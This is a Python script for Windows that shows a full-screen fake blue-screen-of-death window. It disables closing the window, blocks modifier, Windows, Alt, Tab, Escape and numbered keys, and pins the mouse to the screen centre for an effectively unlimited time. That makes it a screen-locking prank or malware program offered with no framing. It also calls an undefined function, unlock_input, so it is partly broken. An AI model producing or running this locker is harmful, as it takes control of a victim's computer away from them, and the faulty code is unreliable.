import pyautogui
import keyboard
import ctypes
import threading
import time
import os
import tkinter as tk
import sys

def fake_bsod():
    os.system('cls')
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)  # 6 = SW_MINIMIZE
    pyautogui.FAILSAFE = False
    screen_w, screen_h = pyautogui.size()

    bsod_text = """
    wtf????!?!?!?!?
    """

    root = tk.Tk()
    root.title("BSOD")
    root.attributes('-fullscreen', True)
    root.configure(bg='#0000AA')

    label = tk.Label(
        root,
        text=bsod_text,
        fg="white",
        bg="#0000AA",
        font=("Consolas", 18)
    )
    label.pack(expand=True)

    def disable_close(*args, **kwargs):
        return "break"

    root.protocol("WM_DELETE_WINDOW", disable_close)
    root.bind("<Alt-F4>", disable_close)
    root.bind("<F11>", disable_close)
    root.bind("<Escape>", disable_close)

    ctypes.windll.user32.SetDisplayConfig(0, None, 0, None, 0x80)

    def restore_color():
        time.sleep(1000000000)
        ctypes.windll.user32.SetDisplayConfig(0, None, 0, None, 0)

    color_thread = threading.Thread(target=restore_color, daemon=True)
    color_thread.start()

    unlock_thread = threading.Thread(target=unlock_input, daemon=True)
    unlock_thread.start()

    root.mainloop()

def block_input():
    end_time = time.time() + 100000000000
    while time.time() < end_time:
        screen_w, screen_h = pyautogui.size()
        center_x = screen_w / 2
        center_y = screen_h / 2
        pyautogui.moveTo(center_x, center_y)
        time.sleep(0.01)

def block_keyboard():
    modifiers = keyboard.all_modifiers
    for key in modifiers:
        keyboard.block_key(key)

    for i in range(150):
        try:
            keyboard.block_key(str(i))
        except:
            pass

    try:
        keyboard.block_key('windows')
        keyboard.block_key('winleft')
        keyboard.block_key('winright')
        keyboard.block_key('f11')
        keyboard.block_key('alt')
        keyboard.block_key('tab')
        keyboard.block_key('esc')
    except:
        pass

if __name__ == "__main__":
    input_thread = threading.Thread(target=block_input, daemon=True)
    input_thread.start()

    keyboard_thread = threading.Thread(target=block_keyboard, daemon=True)
    keyboard_thread.start()

    fake_bsod()
